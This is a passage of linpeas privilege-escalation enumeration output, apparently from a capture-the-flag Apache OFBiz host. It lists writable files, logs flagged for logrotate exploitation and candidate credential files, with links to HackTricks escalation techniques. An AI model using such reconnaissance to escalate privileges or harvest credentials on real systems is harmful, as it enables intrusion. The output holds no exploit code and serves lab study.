/opt/ofbiz/applications/content/groovyScripts/cms/CmsEditAddPrep.groovy
/opt/ofbiz/applications/content/groovyScripts/cms/FeaturePrep.groovy
/opt/ofbiz/applications/content/groovyScripts/cms/GetMenuContext.groovy
/opt/ofbiz/applications/content/groovyScripts/cms/MostRecentPrep.groovy
/opt/ofbiz/applications/content/groovyScripts/cms/UserPermPrep.groovy
/opt/ofbiz/applications/content/groovyScripts/content
/opt/ofbiz/applications/content/groovyScripts/content/ContentSearchOptions.groovy
/opt/ofbiz/applications/content/groovyScripts/content/ContentSearchResults.groovy
/opt/ofbiz/applications/content/groovyScripts/content/GetContentLookupList.groovy
/opt/ofbiz/applications/content/groovyScripts/content/PrepSeqNo.groovy
/opt/ofbiz/applications/content/groovyScripts/contentsetup
/opt/ofbiz/applications/content/groovyScripts/contentsetup/UserPermPrep.groovy
/opt/ofbiz/applications/content/groovyScripts/datasetup
/opt/ofbiz/applications/content/groovyScripts/datasetup/DataCategoryPrep.groovy
/opt/ofbiz/applications/content/groovyScripts/layout
/opt/ofbiz/applications/content/groovyScripts/layout/EditSubContent.groovy
/opt/ofbiz/applications/content/groovyScripts/print
/opt/ofbiz/applications/content/groovyScripts/print/FindPrinters.groovy
/opt/ofbiz/applications/content/groovyScripts/survey
/opt/ofbiz/applications/content/groovyScripts/survey/EditSurveyQuestions.groovy
/opt/ofbiz/applications/content/groovyScripts/survey/EditSurveyResponse.groovy
/opt/ofbiz/applications/content/groovyScripts/survey/ViewSurveyResponses.groovy
/opt/ofbiz/applications/content/groovyScripts/website
/opt/ofbiz/applications/content/groovyScripts/website/EditWebSiteParties.groovy
/opt/ofbiz/applications/content/groovyScripts/website/WebSiteCMSMetaInfo.groovy
/opt/ofbiz/applications/content/groovyScripts/website/WebSitePublishPoint.groovy
/opt/ofbiz/applications/content/minilang
/opt/ofbiz/applications/content/minilang/blog
/opt/ofbiz/applications/content/minilang/blog/BlogServices.xml
/opt/ofbiz/applications/content/minilang/compdoc
/opt/ofbiz/applications/content/minilang/compdoc/CompDocServices.xml
/opt/ofbiz/applications/content/minilang/content
/opt/ofbiz/applications/content/minilang/content/ContentEvents.xml
/opt/ofbiz/applications/content/minilang/content/ContentPermissionEvents.xml
/opt/ofbiz/applications/content/minilang/content/ContentServices.xml
/opt/ofbiz/applications/content/minilang/ContentManagementMapProcessors.xml
/opt/ofbiz/applications/content/minilang/data
/opt/ofbiz/applications/content/minilang/data/DataServices.xml
/opt/ofbiz/applications/content/minilang/layout
/opt/ofbiz/applications/content/minilang/layout/LayoutEvents.xml
/opt/ofbiz/applications/content/minilang/permission
/opt/ofbiz/applications/content/minilang/permission/ContentPermissionServices.xml
/opt/ofbiz/applications/content/minilang/permission/DataResourcePermissionServices.xml
/opt/ofbiz/applications/content/minilang/survey
/opt/ofbiz/applications/content/minilang/survey/SurveyServices.xml
/opt/ofbiz/applications/content/minilang/website
/opt/ofbiz/applications/content/minilang/website/WebSiteServices.xml
/opt/ofbiz/applications/content/ofbiz-component.xml
/opt/ofbiz/applications/content/README.md
/opt/ofbiz/applications/content/servicedef
/opt/ofbiz/applications/content/servicedef/mca.xml
/opt/ofbiz/applications/content/servicedef/secas.xml
/opt/ofbiz/applications/content/servicedef/services_commevent.xml
/opt/ofbiz/applications/content/servicedef/services_contenttypes.xml
/opt/ofbiz/applications/content/servicedef/services_content.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/content/src
/opt/ofbiz/applications/content/src/main
/opt/ofbiz/applications/content/src/main/java
/opt/ofbiz/applications/content/src/main/java/org

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                         
                                                                             


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                       
                            ╚═════════════════════════╝                      
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                
/usr/bin/gettext.sh                                                          

╔══════════╣ Executable files potentially added by user (limit 70)
2023-12-20+10:52:17.3633556080 /usr/local/sbin/laurel                        
2023-12-18+03:18:28.5168743910 /opt/ofbiz/plugins/bizness/webapp/biznessweb/index.html
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/touchSwipe/jquery.touchSwipe.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/touchSwipe/jquery.touchSwipe.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/superfish/superfish.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/superfish/superfish.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/superfish/hoverIntent.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/owl.carousel.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.theme.green.min.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.theme.green.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/ajax-loader.gif
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/isotope/isotope.pkgd.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/isotope/isotope.pkgd.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/easing/easing.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/easing/easing.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/bootstrap/js/bootstrap.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/bootstrap/js/bootstrap.bundle.min.js
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/bootstrap/css/bootstrap.min.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/bootstrap/css/bootstrap.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/animate/animate.min.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/animate/animate.css
2023-12-16+10:48:53.7606919270 /opt/ofbiz/plugins/bizness/webapp/biznessweb/css/style.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/wow/wow.min.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/wow/wow.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/waypoints/waypoints.min.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/waypoints/links.php
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/owl.carousel.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/LICENSE
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.video.play.png
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.theme.default.min.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.theme.default.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.carousel.min.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/owlcarousel/assets/owl.carousel.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/jquery/jquery.min.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/jquery/jquery-migrate.min.js
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/fonts/ionicons.svg
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/fonts/ionicons.eot
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/css/ionicons.min.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/css/ionicons.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/fontawesome-webfont.woff2
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/fontawesome-webfont.woff
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/fontawesome-webfont.ttf
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/fontawesome-webfont.svg
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/fontawesome-webfont.eot
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/fonts/FontAwesome.otf
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/css/font-awesome.min.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/font-awesome/css/font-awesome.css
2023-12-16+10:48:53.7566919220 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/counterup/counterup.min.js
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/links.php
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/js/lightbox.min.js
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/js/lightbox.js
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/images/prev.png
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/images/next.png
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/images/loading.gif
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/images/close.png
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/css/lightbox.min.css
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/lightbox/css/lightbox.css
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/fonts/ionicons.woff
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/lib/ionicons/fonts/ionicons.ttf
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/js/main.js
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/testimonial-4.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/testimonial-1.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/team-3.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/team-2.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/quote-sign-right.png
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/quote-sign-left.png
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/preloader.gif
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/portfolio/web3.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/portfolio/web2.jpg
2023-12-16+10:48:53.7526919160 /opt/ofbiz/plugins/bizness/webapp/biznessweb/img/portfolio/web1.jpg

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                     
drwxr-xr-x  3 root  root           4096 Dec 21 09:15 .
drwxr-xr-x 18 root  root           4096 Dec 21 09:15 ..
drwxr-xr-x 15 ofbiz ofbiz-operator 4096 Jan 15 16:49 ofbiz

╔══════════╣ Unexpected in root
/initrd.img                                                                  
/vmlinuz.old
/initrd.img.old
/vmlinuz

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/lastlog                                                             
/var/log/auth.log
/var/log/journal/5e1bbbd9ec5d475ca2f8372a972bd975/user-1001.journal
/var/log/journal/5e1bbbd9ec5d475ca2f8372a972bd975/system.journal
/var/log/wtmp
/var/log/syslog
/var/log/daemon.log
/opt/ofbiz/runtime/data/derby/ofbiz/log/log33.dat
/opt/ofbiz/runtime/logs/ofbiz.log
/opt/ofbiz/runtime/logs/access_log..2024-01-15
/opt/ofbiz/.gradlew.swp
/tmp/hsperfdata_ofbiz/737
/tmp/hsperfdata_ofbiz/541
/tmp/hsperfdata_ofbiz/65760
/tmp/hsperfdata_ofbiz/868

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                 
logrotate 3.18.0                                                             

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /opt/ofbiz/runtime/data/derby/derby.log
Writable: /opt/ofbiz/runtime/logs/error.log                                  
Writable: /opt/ofbiz/runtime/logs/error-2023-12-20-1.log                     
Writable: /opt/ofbiz/runtime/logs/error-2024-01-15-1.log                     
                                                                             
╔══════════╣ Files inside /home/ofbiz (limit 20)
total 868                                                                    
drwxr-xr-x 6 ofbiz ofbiz-operator   4096 Jan 15 16:35 .
drwxr-xr-x 3 root  root             4096 Dec 21 09:15 ..
lrwxrwxrwx 1 root  root                9 Dec 16 05:21 .bash_history -> /dev/null
-rw-r--r-- 1 ofbiz ofbiz-operator    220 Dec 14 14:24 .bash_logout
-rw-r--r-- 1 ofbiz ofbiz-operator   3560 Dec 14 14:30 .bashrc
drwxr-xr-x 8 ofbiz ofbiz-operator   4096 Dec 21 09:15 .gradle
drwxr-xr-x 3 ofbiz ofbiz-operator   4096 Dec 21 09:15 .java
-rwxr-xr-x 1 ofbiz ofbiz-operator 847834 Dec  9 23:25 linpeas.sh
drwxr-xr-x 3 ofbiz ofbiz-operator   4096 Jan 15 12:48 .local
-rw-r--r-- 1 ofbiz ofbiz-operator    807 Dec 14 14:24 .profile
drwxr-xr-x 2 ofbiz ofbiz-operator   4096 Jan 15 11:51 .ssh
-rw-r----- 1 root  ofbiz-operator     33 Jan 15 09:20 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.nginx-debian.html                                        

╔══════════╣ Searching installed mail applications
                                                                             
╔══════════╣ Mails (limit 50)
                                                                             
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 308 Jan 15 09:20 /run/blkid/blkid.tab.old             
-rw-r--r-- 1 root root 43896 Oct 30 13:02 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 10147 Sep 29 00:25 /usr/lib/modules/5.10.0-26-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 194817 Oct  9  2020 /usr/share/doc/x11-common/changelog.Debian.old.gz
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz                                                                         
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 ofbiz ofbiz-operator 3233 Oct 13 12:04 /opt/ofbiz/.github/workflows/codeql-analysis.yml.bak

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)                                                                          
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)


╔══════════╣ Web files?(output limit)
/var/www/:                                                                   
total 16K
drwxr-xr-x  4 root     root     4.0K Dec 21 09:15 .
drwxr-xr-x 12 root     root     4.0K Dec 21 09:15 ..
drwxr-xr-x  2 root     root     4.0K Dec 21 09:15 html
drwxr-xr-x  7 www-data www-data 4.0K Dec 21 09:15 static

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Dec 21 09:15 .

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                 
-rw-r--r-- 1 root root 0 Jan 15 09:20 /run/network/.ifstate.lock             
-rw-r--r-- 1 root root 2047 Oct 27 02:54 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw------- 1 ofbiz ofbiz-operator 0 Dec 14 14:50 /home/ofbiz/.java/.userPrefs/.userRootModFile.ofbiz
-rw------- 1 ofbiz ofbiz-operator 0 Dec 14 14:38 /home/ofbiz/.java/.userPrefs/.user.lock.ofbiz
-rw-r--r-- 1 ofbiz ofbiz-operator 220 Dec 14 14:24 /home/ofbiz/.bash_logout
-rw-r--r-- 1 ofbiz ofbiz-operator 1969 Oct 13 12:04 /opt/ofbiz/.xmlcatalog.xml
-rw-r--r-- 1 ofbiz ofbiz-operator 278 Oct 13 12:04 /opt/ofbiz/.hgignore
-rw-r--r-- 1 ofbiz ofbiz-operator 365 Oct 13 10:44 /opt/ofbiz/plugins/.project
-rw------- 1 root root 0 Nov  7 06:54 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Mar 27  2022 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Dec 14 14:13 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Dec 14 14:13 /etc/.java/.systemPrefs/.system.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                     
-rw-r--r-- 1 ofbiz ofbiz-operator 131649 Jan 15 09:20 /tmp/gradle1511079707559394605.bin
-rw-r--r-- 1 ofbiz ofbiz-operator 201230 Jan 15 09:20 /tmp/gradle15442314031601091432.bin
-rw-r--r-- 1 ofbiz ofbiz-operator 17 Jan 15 15:13 /tmp/test/.gradle/5.0-rc-5/taskHistory/taskHistory.lock
-rw-r--r-- 1 ofbiz ofbiz-operator 1 Jan 15 15:13 /tmp/test/.gradle/5.0-rc-5/fileChanges/last-build.bin
-rw-r--r-- 1 ofbiz ofbiz-operator 0 Jan 15 15:13 /tmp/test/.gradle/5.0-rc-5/gc.properties
-rw-r--r-- 1 ofbiz ofbiz-operator 17 Jan 15 15:13 /tmp/test/.gradle/5.0-rc-5/fileHashes/fileHashes.lock
-rw-r--r-- 1 ofbiz ofbiz-operator 17 Jan 15 15:13 /tmp/test/.gradle/buildOutputCleanup/buildOutputCleanup.lock
-rw-r--r-- 1 ofbiz ofbiz-operator 54 Jan 15 15:13 /tmp/test/.gradle/buildOutputCleanup/cache.properties
-rwxr--r-- 1 ofbiz ofbiz-operator 847924 Jan 15 14:52 /tmp/test/linpeas.sh
-rwxr--r-- 1 ofbiz ofbiz-operator 848317 Aug 27 00:28 /tmp/linpeas.sh
-rw-r--r-- 1 ofbiz ofbiz-operator 96562 Jan 15 09:20 /tmp/gradle3022054193664986649.bin
-rw-r--r-- 1 ofbiz ofbiz-operator 203391 Jan 15 11:17 /tmp/result
-rw-r--r-- 1 ofbiz ofbiz-operator 61984 Jan 15 09:20 /tmp/gradle7446573776139636031.bin
-rw------- 1 ofbiz ofbiz-operator 32768 Jan 15 16:49 /tmp/hsperfdata_ofbiz/737
-rw------- 1 ofbiz ofbiz-operator 32768 Jan 15 16:48 /tmp/hsperfdata_ofbiz/541
-rw------- 1 ofbiz ofbiz-operator 32768 Jan 15 16:49 /tmp/hsperfdata_ofbiz/65760
-rw------- 1 ofbiz ofbiz-operator 32768 Jan 15 16:49 /tmp/hsperfdata_ofbiz/868
-rw-r--r-- 1 root root 81920 Dec 15 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 0 Dec 15 06:25 /var/backups/dpkg.arch.0

╔══════════╣ Searching passwords in history files
                                                                             
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                   
/opt/ofbiz/framework/base/config/passwords.properties
/opt/ofbiz/framework/security/src/docs/asciidoc/_include/sy-password-and-JWT.adoc
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                             
╔══════════╣ Searching passwords inside logs (limit 70)
                                                                             


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                        
                                ╚════════════════╝                           
Regexes to search for API keys aren't activated, use param '-r' 


 
